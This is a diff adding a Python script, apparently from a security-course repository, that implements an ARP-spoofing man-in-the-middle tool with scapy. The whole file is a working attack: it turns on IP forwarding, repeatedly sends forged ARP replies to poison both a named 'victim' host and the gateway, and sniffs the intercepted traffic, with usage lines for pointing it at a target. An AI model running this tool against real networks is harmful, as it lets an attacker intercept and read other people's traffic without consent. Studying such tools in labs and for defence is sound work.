@@ -1,0 +1,111 @@
+#!/usr/bin/env python
+'''
+Created on 26.04.2013
+
+@author: christoph
+
+you can find this file on bitbucket:
+https://bitbucket.org/chbb/spse/src/master/module3/arp_mitm.py?at=master
+
+
+The is a simple MITM tool. 
+
+
+start the script with required options:
+    python arp_mitm -t <target_ip|victim> -g <ip of gateway>
+
+or with an filter option for scapy
+    python arp_mitm -t <target_ip|victim> -g <ip of gateway> -f "tcp port 80"
+
+
+'''
+import argparse
+import os
+from threading import Thread
+from scapy.all import *
+
+IP_FORWARD_FILE = "/proc/sys/net/ipv4/ip_forward"
+
+
+def handlePacket(p):
+    print p.summary()
+
+def enableForwarding():
+    """
+    this function enables the IP-Forwarding by writing a 1 into the 
+    IP_FORWARD_FILE
+    """
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+
+def disableForwarding():
+    """
+    this function disables the IP-Forwarding by writing a 0 into the 
+    IP_FORWARD_FILE
+    """
+    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+
+
+class Worker (Thread):
+    """
+    this class is a worker thread which do the arp spoofing
+    """
+    def __init__(self, src_ip, dst_ip):
+        """
+        @param src_ip: IP address that should be used as source 
+                        address in the ARP-Request 
+        @param dst_ip: IP address that should be used as destination 
+                        address in the ARP-Request
+        """
+        Thread.__init__(self)
+        self.src_ip = src_ip
+        self.dst_ip = dst_ip
+
+
+    def run(self):
+        # build the ARP-Request
+        arp = ARP(pdst=self.dst_ip, # destination ip address
+                  psrc=self.src_ip) # source ip address
+
+        # send the ARP-Request every second
+        send(arp,           # packet to send
+             verbose=False, # make the function totally silent
+             inter=1,       # time in seconds to wait between 2 packets
+             loop=1)        # send packets endlessly if not 0
+
+
+if __name__ == '__main__':
+    parser = argparse.ArgumentParser(description="This is an ARP-MITM Tool")
+    parser.add_argument("-t", "--target", required=True,  
+                        help="target ip address (victim)")
+    parser.add_argument("-i", "--interface", required=False, default="eth0",
+                        help="interface that should be used")
+    parser.add_argument("-v", "--verbose", required=False, default=False, 
+                        action='store_true', help="verbose output")
+    parser.add_argument("-g", "--gateway", required=True, 
+                        help="ip address of the gateway")
+    parser.add_argument("-f", "--filter", required=False, default="udp port 53",
+                        help="scapy capture filter")
+    args = parser.parse_args()
+
+    enableForwarding()
+
+    worker_threads = []
+    # Thread that tells the client i am the gateway
+    worker_threads.append(Worker(args.gateway, args.target))
+    # Thread that tells the gateway i am the client
+    worker_threads.append(Worker(args.target, args.gateway))
+    try:
+        # start the threads
+        for w in worker_threads: 
+            w.setDaemon(True)
+            w.start()
+        # sniff for packets and pass each packet to the handlePacket function
+        sniff(iface=args.interface, filter=args.filter, prn=handlePacket)
+    except KeyboardInterrupt:
+        # crtl + c => disable IP-Forwarding and exit normally
+        disableForwarding()
+        sys.exit(0)
+    except:
+        # an erorr occurred => disable IP-Forwarding and exit with errorcode 
+        disableForwarding()
+        sys.exit(-1)
